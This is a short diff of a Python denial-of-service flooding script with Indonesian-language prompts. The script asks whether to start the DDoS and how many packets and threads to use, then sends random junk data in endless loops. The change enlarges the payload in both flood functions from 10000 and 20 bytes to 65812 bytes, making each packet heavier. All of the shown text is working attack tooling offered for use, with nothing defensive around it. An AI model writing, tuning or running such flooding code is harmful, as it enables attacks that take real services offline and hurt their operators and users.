@@ -28,7 +28,7 @@ choice = str(input(" GAS DDOS?(y/n):"))
 times = int(input(" PACKET:"))
 threads = int(input(" ISI PACKET:"))
 def run():
-    data = random._urandom(10000)
+    data = random._urandom(65812)
     i = random.choice(("[TOK TOK TOK]","[TOK TOK TOK]"))
     while True:
         try:
@@ -41,7 +41,7 @@ def run():
             print("[×] MAMPUS DOWN!!!")
 
 def run2():
-    data = random._urandom(20)
+    data = random._urandom(65812)
     i = random.choice(("[TOK TOK TOK]","[TOK TOK TOK]"))
     while True:
         try:
